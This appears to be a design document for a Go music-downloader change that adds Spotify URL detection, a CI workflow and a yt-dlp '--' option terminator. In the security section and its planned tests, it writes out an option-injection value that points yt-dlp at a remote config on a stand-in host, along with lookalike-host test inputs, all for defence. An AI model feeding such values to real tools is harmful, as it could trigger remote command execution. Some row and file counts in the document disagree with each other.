# Design: Adapter Routing Fix (Auto URL Detection + Spotify URI Support + Minimal CI)

**Status:** Draft
**Date:** 2026-08-01
**Change:** `adapter-routing-fix`
**Applies to:** Go 1.26.3 + Bubble Tea TUI music-downloader (`github.com/Juanstudy/music-downloader`)

---

## 1. Architecture Overview

### 1.1 High-Level Architecture

```
┌──────────────────────────────────────────────────────────────────────────┐
│                        internal/tui/update.go                             │
│                                                                          │
│  handleInputKeys (Enter, URL mode)                                       │
│    ├─ val = TrimSpace(Input.Value())                                      │
│    ├─ val == ""                              → "Please enter a URL"      │
│    ├─ !Contains("://") && !HasPrefix("spotify:")                         │
│    │                                       → "That doesn't look like…"   │
│    └─ startResolve(val)                                                   │
│         └─ resolveCmd(m.selectedSearcher(val), val)                      │
│              │                                                           │
│              ▼                                                           │
│  selectedSearcher(url string) ports.Searcher                             │
│    ├─ SourceSpotify → spotifySearcher (non-nil) else searcher            │
│    ├─ SourceYouTube → searcher                                            │
│    ├─ SourceAuto    → spotifySearcher only when                          │
│    │                  m.spotifySearcher != nil                            │
│    │                  && spotify.IsSpotifyURL(url)                        │
│    │                  else searcher (yt-dlp, conservative fallback)       │
│    └─ default       → searcher                                            │
│              │                                                           │
│              ▼                                                           │
│  ┌─────────────────────────────────────────────────────────────────┐     │
│  │  internal/adapters/spotify/url.go                                │     │
│  │                                                                  │     │
│  │  IsSpotifyURL(url string) bool  (NEW, exported, host-level)     │     │
│  │    trim → empty? → spotify: prefix? → url.Parse → host check     │     │
│  │                                                                  │     │
│  │  parseSpotifyURL  (UNTOUCHED — entity-level, track-only)         │     │
│  └─────────────────────────────────────────────────────────────────┘     │
│                                                                          │
│  ports.Searcher  (UNCHANGED — ARF-006)                                   │
│  openspec/config.yaml  (UNCHANGED — ARF-006)                             │
└──────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────┐
│  .github/workflows/ci.yml  (NEW — ARF-004/005)                            │
│  on: push + pull_request (no path filters)                                │
│  ubuntu-latest → checkout@v4 → setup-go@v5 (go-version-file: go.mod)      │
│  → go vet ./... → go build ./... → go test -short ./...                   │
└──────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Component Responsibilities

| Component | Responsibility |
| --------- | --------------- |
| `internal/tui/update.go` | URL-aware `selectedSearcher(url string)`; URL-driven `SourceAuto` branch; gate relaxation for `spotify:` prefix; call site passes the pasted URL |
| `internal/adapters/spotify/url.go` | NEW exported `IsSpotifyURL(url string) bool` — single source of truth for the host-level question "is this URL hosted by Spotify?"; `parseSpotifyURL`/`validateTrack` untouched |
| `.github/workflows/ci.yml` (new) | Minimal hermetic gate: vet + build + `go test -short ./...` on every push and PR |
| `ports.Searcher`, orchestrator, downloader, `openspec/config.yaml` | Untouched (ARF-006) |

### 1.3 Dependency direction (no import cycle)

```
internal/tui  ──►  internal/adapters/spotify  ──►  internal/core/ports, internal/core/domain
```

Verified against the current package: `internal/adapters/spotify` imports only stdlib, `internal/core/domain`, and `internal/core/ports` (see `auth.go`, `spotify.go`, `resolve.go`, `url.go`). It does NOT import `internal/tui`, so `update.go` adding an import of the spotify package cannot create a cycle (ARF-003 / ARF-006).

---

## 2. Interface / Type Definitions

### 2.1 NEW exported: `spotify.IsSpotifyURL` (`internal/adapters/spotify/url.go`)

```go
// IsSpotifyURL reports whether rawURL is hosted by Spotify. It answers the
// host-level routing question only: true for HTTP(S) URLs whose host is exactly
// spotify.com or ends with .spotify.com, and for any spotify: URI regardless of
// entity. Entity-level validation (track-only) stays in parseSpotifyURL, which
// is untouched.
//
// Deliberately stricter than parseSpotifyURL's internal host check: the exact
// match plus the ".spotify.com" suffix reject lookalikes like evilspotify.com,
// so a dubious URL routes to the general yt-dlp searcher, never to the
// credentials-gated Spotify adapter (proposal trade-off 3 / ARF-003).
func IsSpotifyURL(rawURL string) bool {
    rawURL = strings.TrimSpace(rawURL)
    if rawURL == "" {
        return false
    }
    if strings.HasPrefix(rawURL, "spotify:") {
        return true
    }
    parsed, err := url.Parse(rawURL)
    if err != nil {
        return false
    }
    host := parsed.Host
    return host == "spotify.com" || strings.HasSuffix(host, ".spotify.com")
}
```

Placement: in `url.go`, directly above `parseSpotifyURL`. Imports required: `net/url` and `strings` — both already imported by `url.go`; **no new imports**.

Exact decision table (derived from ARF-003 scenarios):

| Input | Step that decides | Result |
| ----- | ----------------- | ------ |
| `""` / `"   "` | trim → empty | `false` |
| `spotify:track:{id}`, `spotify:playlist:{id}`, `spotify:album:{id}`, `spotify:artist:{id}` | `HasPrefix(rawURL, "spotify:")` | `true` (host never examined) |
| `https://open.spotify.com/track/{id}` (also playlist/album/artist paths) | `url.Parse` → Host `open.spotify.com` → `.spotify.com` suffix | `true` |
| `https://www.spotify.com/...` | Host `www.spotify.com` → `.spotify.com` suffix | `true` |
| `https://spotify.com/track/x` | Host `spotify.com` → exact match | `true` |
| `https://music.youtube.com/watch?v=...`, `https://youtube.com/...` | Host ends with neither `spotify.com` nor `.spotify.com` | `false` |
| `https://evilspotify.com/track/x` | Host `evilspotify.com` — char before `spotify.com` is `l`, not `.` → suffix fails | `false` |
| `https://spotify.com.evil.example/track/x` | Host ends with `evil.example` | `false` |

The critical detail: the suffix carries a **leading dot** (`.spotify.com`), which is exactly what rejects `evilspotify.com`. This is the documented divergence from `parseSpotifyURL`'s looser `strings.HasSuffix(parsed.Host, "spotify.com")` (proposal trade-off 3; ARF-003) — `parseSpotifyURL` itself is NOT changed this slice (ARF-007).

### 2.2 MODIFIED: `selectedSearcher` (`internal/tui/update.go`)

```go
// selectedSearcher returns the Searcher that should be used based on the
// current source mode and, in Auto mode, the pasted URL/URI.
func (m Model) selectedSearcher(url string) ports.Searcher {
    switch m.sourceMode {
    case SourceSpotify:
        if m.spotifySearcher != nil {
            return m.spotifySearcher
        }
        return m.searcher
    case SourceYouTube:
        return m.searcher
    case SourceAuto:
        // URL-driven auto-detection: Spotify only for a recognized Spotify
        // URL/URI with credentials configured; everything else falls back to
        // the general-purpose yt-dlp searcher.
        if m.spotifySearcher != nil && spotify.IsSpotifyURL(url) {
            return m.spotifySearcher
        }
        return m.searcher
    default:
        return m.searcher
    }
}
```

Only the `SourceAuto` branch changes semantically; `SourceSpotify`, `SourceYouTube`, and `default` are byte-for-byte identical to today (ARF-001, explicit modes preserved).

### 2.3 MODIFIED: call site (`startResolve`, `internal/tui/update.go`)

```go
// Before:
return m, resolveCmd(m.selectedSearcher(), url)
// After:
return m, resolveCmd(m.selectedSearcher(url), url)
```

The URL is already in hand at this call site (`startResolve(url string)`) — a signature change, not a plumbing project (proposal §1, §4.1).

### 2.4 MODIFIED: URL-mode input gate (`handleInputKeys`, `internal/tui/update.go`)

```go
// Before:
if !strings.Contains(val, "://") {
    m.inputErr = "That doesn't look like a URL. Press 's' to switch to Search mode."
    return m, nil
}
// After:
if !strings.Contains(val, "://") && !strings.HasPrefix(val, "spotify:") {
    m.inputErr = "That doesn't look like a URL. Press 's' to switch to Search mode."
    return m, nil
}
```

The trimmed-empty check ("Please enter a URL") runs first and is unchanged (ARF-002). Only the `spotify:` prefix is admitted; `itunes:`, `tidal:`, and any other scheme stay blocked (ARF-008).

### 2.5 Function signature changes summary

| Symbol | Before | After |
| ------ | ------ | ----- |
| `spotify` | — | `IsSpotifyURL(url string) bool` (exported, host-level) |
| `tui.Model.selectedSearcher` | `func (m Model) selectedSearcher() ports.Searcher` | `func (m Model) selectedSearcher(url string) ports.Searcher` |
| `tui.startResolve` call site | `resolveCmd(m.selectedSearcher(), url)` | `resolveCmd(m.selectedSearcher(url), url)` |
| URL-mode gate | `if !strings.Contains(val, "://")` | `if !strings.Contains(val, "://") && !strings.HasPrefix(val, "spotify:")` |
| `spotify.parseSpotifyURL` / `validateTrack` | unchanged | **unchanged** (ARF-007) |
| `ports.Searcher` / orchestrator | unchanged | **unchanged** (ARF-006) |
| `searcher.searchArgs` (yt-dlp searcher) | inline arg slice in `Search` | extracted pure `searchArgs(url string) []string` with trailing `--` (ARF-010) |
| `downloader.buildArgs` | arg slice ends at `media.URL` | `--` inserted immediately before `media.URL` (ARF-010) |

---

### 2.6 NEW: yt-dlp option terminator (`internal/adapters/searcher/ytdlp.go`, `internal/adapters/downloader/ytdlp.go`)

**Problem (ARF-010, from review finding R1-01):** the URL-aware routing change sends
any non-Spotify input containing `://` to the yt-dlp searcher in Auto+Spotify-configured
mode. The searcher passes the user string as the last argv element with no `--`
separator, so a pasted `--config-location=http://evil.example/x` (passes the `://`
gate, fails `IsSpotifyURL` because `url.Parse` yields no host) is parsed by yt-dlp as
an OPTION, not a URL — yt-dlp fetches a remote config and applies arbitrary options
(e.g. `--exec`, `--cookies-from-browser`, `--proxy`), which on a subsequent download
can execute local commands. `exec.CommandContext` (argv slice, no shell) prevents
shell-metacharacter injection, but option injection into yt-dlp remains.

**Fix:** a `--` option terminator immediately before the URL argument in both
invocations, so everything after it is positional.

```go
// searcher: extracted pure builder (unit-testable without yt-dlp)
func searchArgs(url string) []string {
return []string{"--flat-playlist", "--dump-json", "--ignore-errors", "--no-warnings", "--", url}
}

// downloader: inside buildArgs, immediately before media.URL
args = append(args, "--embed-metadata", "--embed-thumbnail", "--add-metadata",
"-o", outputTemplate, "--no-warnings", "--", media.URL)
```

**Why safe:** `--` is a standard POSIX-style option terminator that yt-dlp honors;
URLs do not begin with `--`, so the terminator never changes behavior for legitimate
input. It only stops option interpretation for hostile input.

**Scope discipline:** these two files were previously untouched per ARF-006. The
user explicitly authorized this scope expansion (single focused fix). ARF-006 is
amended: downloader and yt-dlp searcher receive exactly this one scoped change and
nothing else; their existing tests (`TestBuildArgs_*`, `TestDownloader_*`) stay
green byte-for-byte except the added terminator assertions.

---

## 3. File-by-File Change Plan

Order is strict TDD: **tests first, red, then implementation**. The apply phase must follow this sequence (§5.1).

### 3.1 MODIFIED: `internal/adapters/spotify/url_test.go` — FIRST (red)

Add `TestIsSpotifyURL`, a table-driven test mirroring the existing `TestParseSpotifyURL` convention (struct slice + `t.Run(tt.name, ...)` subtests). Sixteen rows from the spec's Test Specifications (§ "Test: IsSpotifyURL table"): the 9 `true` cases (4 `open.spotify.com` entity paths, `www.spotify.com`, 4 `spotify:` URI entities) and 7 `false` cases (`music.youtube.com`, `youtube.com`, `evilspotify.com`, `spotify.com.evil.example`, `""`, `"   "`, plus `spotify.com.evil.example` URL form covered above).

```go
func TestIsSpotifyURL(t *testing.T) {
    tests := []struct {
        name string
        url  string
        want bool
    }{ /* 16 rows from the spec table */ }
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            if got := IsSpotifyURL(tt.url); got != tt.want {
                t.Errorf("IsSpotifyURL(%q) = %v, want %v", tt.url, got, tt.want)
            }
        })
    }
}
```

**Red state:** does not compile — `IsSpotifyURL` is undefined.

### 3.2 MODIFIED: `internal/adapters/spotify/url.go` — GREEN for 3.1

Add the `IsSpotifyURL` function (§2.1) above `parseSpotifyURL`. No other change to the file. `go test ./internal/adapters/spotify/` must be green before moving on.

### 3.3 MODIFIED: `internal/tui/update_test.go` — SECOND (red)

Two additions, both using the existing `Model{}` literal convention (never `NewModel`), the existing `stubSearcher` sentinel (implements `ports.Searcher`), and `newInput()`:

**a) `TestSelectedSearcherRouting`** — table of 8 rows from the spec's "TUI searcher routing table": cases 1–5 (Auto), 6 (SourceYouTube), 7a/7b (SourceSpotify). Distinct sentinel pointers `yt := &stubSearcher{}` and `sp := &stubSearcher{}`; `Model{sourceMode: tt.mode, searcher: yt}` and `spotifySearcher: sp` only when `tt.configured`. Assert **identity** (`got != tt.want`) so a wrong-but-non-nil searcher still fails:

```go
func TestSelectedSearcherRouting(t *testing.T) {
    yt := &stubSearcher{}
    sp := &stubSearcher{}
    tests := []struct {
        name       string
        mode       SourceMode
        url        string
        configured bool
        want       ports.Searcher
    }{
        // case 1 (issue #19): Auto + YouTube Music URL + configured → yt
        {name: "auto youtube url configured", mode: SourceAuto, url: "https://music.youtube.com/watch?v=...", configured: true, want: yt},
        // case 2: Auto + open.spotify.com/track + configured → sp
        {name: "auto spotify track configured", mode: SourceAuto, url: "https://open.spotify.com/track/{id}", configured: true, want: sp},
        // case 3: Auto + spotify: URI + configured → sp
        {name: "auto spotify uri configured", mode: SourceAuto, url: "spotify:track:{id}", configured: true, want: sp},
        // case 4: Auto + Spotify URL, no credentials → yt
        {name: "auto spotify url no creds", mode: SourceAuto, url: "https://open.spotify.com/track/{id}", configured: false, want: yt},
        // case 5: Auto + non-Spotify URL, no credentials → yt
        {name: "auto youtube url no creds", mode: SourceAuto, url: "https://music.youtube.com/watch?v=...", configured: false, want: yt},
        // case 6: SourceYouTube ignores the URL → yt
        {name: "youtube mode spotify url", mode: SourceYouTube, url: "https://open.spotify.com/track/{id}", configured: true, want: yt},
        {name: "youtube mode spotify uri", mode: SourceYouTube, url: "spotify:track:{id}", configured: true, want: yt},
        // case 7a: SourceSpotify + configured → sp
        {name: "spotify mode configured", mode: SourceSpotify, url: "https://music.youtube.com/watch?v=...", configured: true, want: sp},
        // case 7b: SourceSpotify + not configured → yt
        {name: "spotify mode no creds", mode: SourceSpotify, url: "https://open.spotify.com/track/{id}", configured: false, want: yt},
    }
    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            m := Model{sourceMode: tt.mode, searcher: yt}
            if tt.configured {
                m.spotifySearcher = sp
            }
            if got := m.selectedSearcher(tt.url); got != tt.want {
                t.Errorf("selectedSearcher(%q) = %v, want %v", tt.url, got, tt.want)
            }
        })
    }
}
```

**b) Gate tests** — mirror `TestURLMode_ValidURLStillResolves` / `TestURLMode_NonURLSuggestion` exactly:

```go
// spotify: URI accepted — no "That doesn't look like a URL" (ARF-002)
func TestURLMode_SpotifyURIAccepted(t *testing.T) {
    m := Model{Screen: ScreenInput, Ready: true, searchMode: SearchModeURL, Input: newInput()}
    m.Input.SetValue("spotify:track:4iV5W9uYEdYUVa79Axb7Rh")
    m2, cmd := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
    updated := m2.(Model)
    // assert Screen == ScreenResolving
    // assert cmd != nil
    // assert !strings.Contains(updated.inputErr, "That doesn't look like a URL")
}

// any other scheme stays blocked (ARF-008)
func TestURLMode_OtherSchemeStillBlocked(t *testing.T) {
    m := Model{Screen: ScreenInput, Ready: true, searchMode: SearchModeURL, Input: newInput()}
    m.Input.SetValue("itunes:track:123")
    m2, _ := m.Update(tea.KeyMsg{Type: tea.KeyEnter})
    updated := m2.(Model)
    // assert Screen == ScreenInput
    // assert strings.Contains(updated.inputErr, "That doesn't look like a URL")
}
```

**Red state:** does not compile — `selectedSearcher()` takes no argument. (If the apply agent widens the signature first with the old body, case 1 is then behaviorally red: Auto returns `sp` for the YouTube URL — the spec's stated red condition for issue #19. Both are legitimate red-first states; the tests are always written in final form first.)

### 3.4 MODIFIED: `internal/tui/update.go` — GREEN for 3.3

1. Add import `"github.com/Juanstudy/music-downloader/internal/adapters/spotify"` (no cycle — §1.3).
2. Relax the URL-mode gate (§2.4).
3. Update the `startResolve` call site to `resolveCmd(m.selectedSearcher(url), url)` (§2.3).
4. Change the `selectedSearcher` signature and the `SourceAuto` branch (§2.2).

`go test ./internal/tui/` must be green before moving on.

### 3.5 NEW: `.github/workflows/ci.yml` — LAST

Written after the Go work is green (a workflow file has no Go behavior; strict TDD applies to executable Go, the workflow is verified by file inspection in the verify phase). YAML shape (ARF-004/005):

```yaml
name: CI

on:
  push:
  pull_request:

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - run: go vet ./...
      - run: go build ./...
      - run: go test -short ./...
```

Constraints honored: triggers `push` + `pull_request` with **no keys** under each (all branches, no path filters); exactly one job on `ubuntu-latest`; steps in the specified order; `go-version-file: go.mod` pins Go 1.26.3; `-short` present so network-gated yt-dlp/Spotify integration tests skip and CI stays hermetic; **no** linter, coverage, caching, matrix, or path filters (ARF-005).

### 3.6 MODIFIED: `internal/adapters/searcher/ytdlp.go` + `internal/adapters/downloader/ytdlp.go` — option terminator (ARF-010)

**TDD phase:** RED → unit tests asserting the terminator (no yt-dlp needed).

1. `internal/adapters/searcher/ytdlp_test.go` — add `TestSearchArgs_OptionTerminatorBeforeURL`: table-driven over `searchArgs(url)` asserting `args[len-2] == "--"` and `args[len-1] == url`, with rows for a regular URL, `--config-location=http://evil.example/x`, and `--output`. RED: `searchArgs` undefined.
2. `internal/adapters/searcher/ytdlp.go` — extract `searchArgs(url string) []string` (pure) returning `["--flat-playlist", "--dump-json", "--ignore-errors", "--no-warnings", "--", url]`; `Search` calls it. GREEN.
3. `internal/adapters/downloader/ytdlp_test.go` — add `TestBuildArgs_OptionTerminatorBeforeURL`: `buildArgs(media, outputDir, "")` asserting `args[len-2] == "--"` and `args[len-1] == media.URL`. RED.
4. `internal/adapters/downloader/ytdlp.go` — insert `"--"` immediately before `media.URL` in `buildArgs`. GREEN; existing `TestBuildArgs_*` stay green.

**No behavior change for legitimate input:** URLs never start with `--`; `--` only stops option interpretation for hostile input.

---

## 4. Data Flow Details

### 4.1 Enter key, URL mode (ARF-002 + ARF-001)

```
User pastes value in URL mode and presses Enter
        │
        ▼
handleInputKeys → val = strings.TrimSpace(m.Input.Value())
        │
        ├─ val == ""                        → inputErr = "Please enter a URL" (unchanged)
        ├─ !Contains("://") && !HasPrefix("spotify:")
        │                                   → inputErr = "That doesn't look like a URL…" (unchanged message)
        └─ startResolve(val)
             ├─ Screen = ScreenResolving; Input.Blur(); InputID++
             └─ resolveCmd(m.selectedSearcher(val), val)
                   ├─ selectedSearcher decides per §2.2 (URL-driven in Auto)
                   └─ s.Search(ctx, val) in a goroutine → resolveFinishedMsg
```

The searcher returned by `selectedSearcher(url)` is the one used for resolution (ARF-001 "resolution command receives the URL-aware selection").

### 4.2 Routing table → code branches

| Case | `sourceMode` | URL | `spotifySearcher` | Branch taken in `selectedSearcher` | Returns |
| ---- | ------------ | --- | ----------------- | --------------------------------- | ------- |
| 1 (issue #19) | Auto | `music.youtube.com/watch?v=...` | non-nil | Auto: `IsSpotifyURL` false → fallback | `m.searcher` |
| 2 | Auto | `open.spotify.com/track/{id}` | non-nil | Auto: non-nil && true → Spotify | `m.spotifySearcher` |
| 3 | Auto | `spotify:track:{id}` | non-nil | Auto: non-nil && true (prefix) → Spotify | `m.spotifySearcher` |
| 4 | Auto | `open.spotify.com/track/{id}` | nil | Auto: `m.spotifySearcher != nil` false | `m.searcher` |
| 5 | Auto | `music.youtube.com/watch?v=...` | nil | Auto: both conditions false | `m.searcher` |
| 6 | SourceYouTube | any (incl. Spotify) | either | `case SourceYouTube` | `m.searcher` |
| 7a | SourceSpotify | any | non-nil | `case SourceSpotify` | `m.spotifySearcher` |
| 7b | SourceSpotify | any | nil | `case SourceSpotify` | `m.searcher` |
| — | any other value | — | — | `default` | `m.searcher` |

### 4.3 Spotify URI end-to-end (newly reachable path)

```
spotify:track:{id}  (copied from Spotify share menu)
  → gate: HasPrefix("spotify:") → admitted                      (ARF-002)
  → startResolve → selectedSearcher → Auto && configured:
       IsSpotifyURL → HasPrefix("spotify:") → true → Spotify searcher   (ARF-001)
  → spotifySearcher.Search → parseSpotifyURL("spotify:track:{id}")
       → URI branch already supported, unchanged → track resolves (ARF-007)
Non-track URIs (spotify:playlist:…) route the same way and are rejected by
parseSpotifyURL: "only track URLs are supported in this version" — routing is
host-level, validation is entity-level (ARF-007, proposal question 1).
```

---

## 5. Testing Strategy

Conventions followed: TUI scenario tests use `Model{}` literals with sentinel `stubSearcher` pointers and identity assertions; URL/helper tests are table-driven with `t.Run` subtests (both existing conventions, verified in `update_test.go` and `url_test.go`); network-gated integration tests stay `testing.Short()`-gated; runner is `go test -short ./...` per `openspec/config.yaml` (ARF-009).

### 5.1 Requirement → Test Mapping (ARF-001 … ARF-009)

Strict TDD sequence (red → green per step, run the package tests before advancing):

| Step | Req | Test | File | Red state |
| ---- | --- | ---- | ---- | --------- |
| 1 (RED) | ARF-003 | `TestIsSpotifyURL` (16-row table) | `internal/adapters/spotify/url_test.go` | does not compile (`IsSpotifyURL` undefined) |
| 2 (GREEN) | ARF-003 | implement `IsSpotifyURL` (§2.1) | `internal/adapters/spotify/url.go` | — |
| 3 (RED) | ARF-001, ARF-008 | `TestSelectedSearcherRouting` (cases 1–7b) + `TestURLMode_SpotifyURIAccepted` + `TestURLMode_OtherSchemeStillBlocked` | `internal/tui/update_test.go` | does not compile (`selectedSearcher` arity); case 1 behaviorally red once the signature is widened with the old body |
| 4 (GREEN) | ARF-001, ARF-002 | `selectedSearcher(url string)` + Auto branch; gate relaxation; call site | `internal/tui/update.go` | — |
| 5 | ARF-009 | `go vet ./...` && `go build ./...` && `go test -short ./...` | repo gates | exit 0 required |
| 6 | ARF-004, ARF-005 | write `.github/workflows/ci.yml` (§3.5) | new file | — |
| 7 (verify phase) | ARF-004, ARF-005 | file inspection: exists; `on:` has `push`+`pull_request` with no path filters; `ubuntu-latest`; `checkout@v4`; `setup-go@v5` with `go-version-file: go.mod`; steps in order vet → build → test -short; no linter/coverage/caching/matrix/filters | `.github/workflows/ci.yml` | per spec's "CI workflow (file inspection)" test |
| 8 (verify phase) | ARF-006 | `openspec/config.yaml` byte-identical; `ports.Searcher` unchanged; `internal/adapters/spotify` does not import `internal/tui` | repo-wide | — |
| 9 (verify phase) | ARF-007 | existing `TestParseSpotifyURL` rows (playlist/album/artist → "only track URLs are supported") still pass unchanged | `internal/adapters/spotify/url_test.go` | — |

Existing tests that pin no-regression and MUST stay green unchanged (ARF-002, ARF-009): `TestEnterEmptyURLShowsError`, `TestInputWhitespaceURL`, `TestURLMode_NonURLSuggestion` (`"hello world"` still blocked), `TestURLMode_ValidURLStillResolves`, the search-mode suite, and the Tab-cycle behavior tests.

### 5.2 Test helper additions

- `update_test.go`: none required beyond the existing `stubSearcher`/`newInput()` — the routing table needs only two distinct `&stubSearcher{}` sentinels (`yt`, `sp`).
- `url_test.go`: none — plain table, existing imports (`strings`, `testing`) suffice.

### 5.3 Repository gates (ARF-009)

```bash
go vet ./...        # exit 0
go build ./...      # exit 0
go test -short ./... # exit 0, hermetic (network-gated integration tests skip)
```

---

## 6. Key Design Decisions

### 6.1 URL-driven routing confined to the `SourceAuto` branch

`selectedSearcher(url string)` is URL-aware only in Auto mode. Explicit modes (`SourceSpotify`, `SourceYouTube`) keep today's semantics byte-for-byte, so the fix cannot regress the explicit flows (ARF-001 cases 6–7; proposal trade-off 1).

### 6.2 Single source of truth: `spotify.IsSpotifyURL`, imported by `tui`

The host question lives in the `spotify` package; `internal/tui` imports it. Alternatives rejected: duplicating the host logic in `tui` (two sources of truth that can drift) and adding a method to `ports.Searcher` (port change — violates ARF-006). No cycle: `spotify` imports only stdlib + `internal/core/domain` + `internal/core/ports` (§1.3).

### 6.3 Routing (host) and validation (entity) are separate concerns

`IsSpotifyURL` answers "hosted by Spotify?"; `parseSpotifyURL` answers "is it a track?" — untouched. Consequence (proposal question 1, accepted): `open.spotify.com/playlist/...` and `spotify:playlist:...` route TO the Spotify searcher and get rejected there with the existing clear message — identical to today's explicit Spotify mode. The user-visible error is already shipped and clear; no new failure modes.

### 6.4 Stricter host check than the resolver's — intentional, safe-direction

`host == "spotify.com" || strings.HasSuffix(host, ".spotify.com")` rejects `evilspotify.com` (the leading dot in the suffix is the operative detail) whereas `parseSpotifyURL`'s existing `HasSuffix(parsed.Host, "spotify.com")` would accept it. Divergence is deliberate (proposal trade-off 3 / ARF-003): the router is the security boundary, and a false negative routes to the general yt-dlp searcher — never to the credentials-gated Spotify adapter. The resolver's internal check is left untouched this slice (ARF-007; aligning it is explicitly out of scope).

### 6.5 Minimal gate relaxation: `spotify:` prefix only

`!strings.Contains(val, "://") && !strings.HasPrefix(val, "spotify:")` — exactly one new admission shape (ARF-008). Junk that passes (`spotify:track` without ID) is rejected downstream by `parseSpotifyURL` with a clear error ("invalid Spotify URI format"), matching the spec's malformed-input edge case; no half-baked generic-URI support.

### 6.6 Conservative fallback direction

Every ambiguous or unrecognized input (YouTube, lookalikes, junk, empty host, unparseable) resolves through yt-dlp, the general resolver. Only a *positive* Spotify identification with credentials configured routes to the Spotify adapter. This is the same fallback philosophy the app already applies to explicit Spotify mode without credentials.

### 6.7 Minimal CI mirrors the local runner exactly

`go test -short ./...` is the `openspec/config.yaml` runner; the workflow runs the identical command so CI cannot be green where local is red or vice versa (ARF-004/009, proposal §10 risk "CI false-green"). `-short` keeps it hermetic.

### 6.8 Sentinel-identity routing tests

`Model{}` literals with two distinct `&stubSearcher{}` pointers and `got != want` identity assertions — the existing test convention (verified in `update_test.go`). No `NewModel`, no real adapters, no network.

---

## 7. Open Decisions (assumed — verify phase should pin these as written)

Micro-decisions the proposal/spec left implicit; none change the locked architecture:

1. **`spotify:` prefix check is case-sensitive.** `strings.HasPrefix` is case-sensitive and `parseSpotifyURL`'s own prefix check is case-sensitive too — a `SPOTIFY:track:x` is rejected at the gate and routes to yt. Real Spotify share URIs are lowercase; consistent and conservative. No case-folding.
2. **Explicit ports in the host are not handled.** `url.Parse`'s `parsed.Host` includes the port, so `https://open.spotify.com:443/track/x` → `false` → routes to yt. No spec case has a port; a false negative is the safe direction (§6.6). If desired, the apply phase could strip the port with `net.SplitHostPort` — not required by any spec case, keep minimal.
3. **Scheme-less `spotify.com` returns `false`** (`url.Parse` yields an empty Host). Irrelevant in URL mode: the gate requires `://` or `spotify:`, so a bare host never reaches routing.
4. **Whitespace-tolerant URI admission.** `TrimSpace` runs before the gate and inside `IsSpotifyURL`, so `" spotify:track:x "` is admitted and recognized. Consistent with the existing trim behavior.
5. **YAML trigger shape.** Map form (`on:` with `push:` / `pull_request:` empty) chosen over list form; both satisfy ARF-004/005 (no path filters). Job name `ci`.
6. **CI file is written after the Go work.** The workflow is a config artifact, not executable Go; strict TDD covers the Go behavior. The verify phase runs the file-inspection test (§5.1 step 7).
7. **Bare `spotify:` / `spotify:track` (no ID) admitted by gate + router.** Both `IsSpotifyURL` (prefix) and the gate accept them; `parseSpotifyURL` rejects with "invalid Spotify URI format" — the spec's malformed-input edge case, no special handling needed.
8. **`update.go` import ordering.** The new spotify import goes with the other `internal/...` imports, after the stdlib block, per the existing grouping (`gofmt`-stable).

---

## 8. Migration / Rollback

### 8.1 Migration (forward)

Additive, deploy order:

1. `TestIsSpotifyURL` (red) → `IsSpotifyURL` in `url.go` (green).
2. Routing + gate tests (red) → `update.go` changes (green).
3. `go vet ./...`, `go build ./...`, `go test -short ./...` all green.
4. `.github/workflows/ci.yml`.
5. Spec/design artifacts: canonical specs already updated in this change; `openspec/specs/github-workflows/spec.md` is a new domain artifact (no existing canonical file to update).

### 8.2 Rollback (backward)

Per proposal §11 — revert `update.go` (signature, Auto branch, gate), remove or keep the additive `IsSpotifyURL` export, revert both test files, delete `ci.yml`. No data, config, or persisted state is touched; zero migration cost.

### 8.3 Compatibility guarantees

| Artifact | Affected? |
| -------- | --------- |
| `ports.Searcher`, orchestrator, downloader | NO — unchanged (ARF-006) |
| `spotify.parseSpotifyURL`, `validateTrack`, error messages | NO — unchanged (ARF-007) |
| `openspec/config.yaml` | NO — byte-identical (ARF-006) |
| `audio-quality` change files/behavior | NO — untouched (ARF-006) |
| Users without Spotify credentials (Auto → yt) | NO — unchanged (cases 4–5) |
| Explicit modes, search mode, Tab cycle, empty-input error | NO — unchanged (ARF-002, ARF-009) |
| Existing TUI/spotify tests | NO — unchanged and must stay green |

---

## 9. Risks and Mitigations

| Risk | Severity | Mitigation |
| ---- | -------- | ---------- |
| Regression for users *without* credentials | Low | Their path never changes; routing cases 4–5 pin it |
| Regression in explicit modes | Low | Branches byte-identical; cases 6–7 pin it |
| Import cycle (`tui` → `spotify`) | None | Verified: `spotify` imports only stdlib + `core/domain` + `core/ports` (§1.3) |
| Gate relaxation admits junk (`spotify:track` no ID, `SPOTIFY:` casing) | Low | Resolver rejects with existing clear errors (ARF-007/§9 edge cases); only `spotify:` admitted (ARF-008) |
| Host-suffix spoofing (`evilspotify.com`, `spotify.com.evil.example`) | None | Exact + `.spotify.com`-suffix rule; `IsSpotifyURL` table pins all four hostile cases |
| CI false-green / locally red | Low | Workflow runs the exact `openspec/config.yaml` command (`go test -short ./...`); setup-go pins Go via `go-version-file: go.mod` |
| Behavior flip for configured users (the point of #19) | Intentional | Broken path (every URL → Spotify) is the bug; explicit Spotify mode remains available via Tab |
| TDD discipline slip | Low | `strict_tdd: true` in `openspec/config.yaml`; §5.1 fixes the red→green order |

### 9.1 Review workload forecast (per file, added/changed lines)

| File | Est. lines | Status |
| ---- | ---------- | ------ |
| `internal/adapters/spotify/url.go` | ~20 | MODIFIED (IsSpotifyURL only) |
| `internal/adapters/spotify/url_test.go` | ~45 | MODIFIED (16-row table) |
| `internal/tui/update.go` | ~12 changed | MODIFIED (signature, Auto branch, gate, call site) |
| `internal/tui/update_test.go` | ~85 | MODIFIED (routing table + 2 gate tests) |
| `.github/workflows/ci.yml` | ~20 | NEW |
| **Total** | **~180–200** | well under the 400-line single-PR budget |

Single PR (`ask-on-risk`), no chain. No auth/security/payments code touched; dominant risk is behavior/regressions → **one standard lens: `review-reliability`** (per the review-lens risk table: behavior, state, tests, determinism, regressions). No 4R fan-out.

---

## Summary of Changed Files

| File | Status | Change Summary |
| ---- | ------ | -------------- |
| `internal/adapters/spotify/url.go` | **MODIFIED** | NEW exported `IsSpotifyURL(url string) bool` (§2.1); `parseSpotifyURL`/`validateTrack` untouched |
| `internal/adapters/spotify/url_test.go` | **MODIFIED** | `TestIsSpotifyURL` 16-row table (ARF-003) |
